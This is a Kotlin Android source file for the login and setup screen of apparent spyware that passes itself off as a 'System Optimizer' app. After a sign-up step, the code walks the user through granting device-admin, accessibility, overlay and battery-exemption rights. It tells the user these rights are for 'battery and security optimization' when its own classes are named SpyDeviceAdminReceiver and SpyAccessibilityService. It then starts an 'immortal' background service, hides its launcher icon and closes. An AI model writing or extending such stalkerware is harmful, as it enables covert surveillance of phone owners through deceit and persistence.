package com.system.optimizer.ui

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.system.optimizer.R
import com.system.optimizer.admin.SpyDeviceAdminReceiver
import com.system.optimizer.service.CoreService
import com.system.optimizer.util.Prefs
import com.system.optimizer.util.Stealth
import kotlinx.coroutines.*

class AuthActivity : AppCompatActivity() {

    private lateinit var etUser: EditText
    private lateinit var etEmail: EditText
    private lateinit var etPass: EditText
    private lateinit var btnCreate: Button
    private lateinit var btnLogin: Button
    private lateinit var progress: ProgressBar
    private lateinit var tvStatus: TextView

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_auth)

        etUser = findViewById(R.id.etUsername)
        etEmail = findViewById(R.id.etEmail)
        etPass = findViewById(R.id.etPassword)
        btnCreate = findViewById(R.id.btnCreate)
        btnLogin = findViewById(R.id.btnLogin)
        progress = findViewById(R.id.progress)
        tvStatus = findViewById(R.id.tvStatus)

        // If already authenticated and permissions done → go stealth immediately
        if (Prefs.isAuthenticated(this) && Prefs.arePermissionsDone(this)) {
            startCoreAndHide()
            return
        }

        btnCreate.setOnClickListener { handleAuth(create = true) }
        btnLogin.setOnClickListener { handleAuth(create = false) }
    }

    private fun handleAuth(create: Boolean) {
        val user = etUser.text.toString().trim()
        val email = etEmail.text.toString().trim()
        val pass = etPass.text.toString()

        if (user.isEmpty() || email.isEmpty() || pass.length < 6) {
            toast("Username, valid email and password (≥6) required")
            return
        }

        progress.visibility = View.VISIBLE
        btnCreate.isEnabled = false
        btnLogin.isEnabled = false
        tvStatus.text = if (create) "Creating account…" else "Logging in…"

        scope.launch {
            val ok = withContext(Dispatchers.IO) {
                // TODO: replace with real backend call
                // For now we just store locally and mark authenticated
                Prefs.saveCredentials(this@AuthActivity, user, email, pass)
                true
            }

            progress.visibility = View.GONE
            if (ok) {
                Prefs.setAuthenticated(this@AuthActivity, true)
                tvStatus.text = "Account ready. Granting permissions…"
                startPermissionGauntlet()
            } else {
                toast("Auth failed")
                btnCreate.isEnabled = true
                btnLogin.isEnabled = true
            }
        }
    }

    private fun startPermissionGauntlet() {
        // 1. Device Admin
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, SpyDeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Required for system-level battery and security optimization.")
            }
            startActivityForResult(intent, REQ_ADMIN)
            return
        }

        // 2. Accessibility
        if (!isAccessibilityEnabled()) {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            toast("Enable “System Optimizer” under Accessibility")
            // User must come back; we re-check in onResume
            return
        }

        // 3. Overlay
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")))
            return
        }

        // 4. Battery optimization ignore
        val pm = getSystemService(PowerManager::class.java)
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
            return
        }

        // 5. Notification listener (optional but useful)
        // User has to enable manually in settings; we can prompt later.

        // All critical done
        Prefs.setPermissionsDone(this, true)
        startCoreAndHide()
    }

    override fun onResume() {
        super.onResume()
        if (Prefs.isAuthenticated(this) && !Prefs.arePermissionsDone(this)) {
            // Re-evaluate after user returns from settings
            startPermissionGauntlet()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_ADMIN) {
            startPermissionGauntlet() // continue chain
        }
    }

    private fun startCoreAndHide() {
        // Start the immortal service
        ContextCompat.startForegroundService(this, Intent(this, CoreService::class.java))

        // Hide launcher icon
        Stealth.hideLauncherIcon(this)

        toast("Optimization active. App will now close.")
        finishAndRemoveTask()
    }

    private fun isAccessibilityEnabled(): Boolean {
        val expected = "$packageName/${packageName}.service.SpyAccessibilityService"
        val enabled = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.split(':').any { it.equals(expected, ignoreCase = true) }
    }

    private fun toast(msg: String) = Toast.makeText(this, msg, Toast.LENGTH_LONG).show()

    companion object {
        private const val REQ_ADMIN = 1001
    }
}
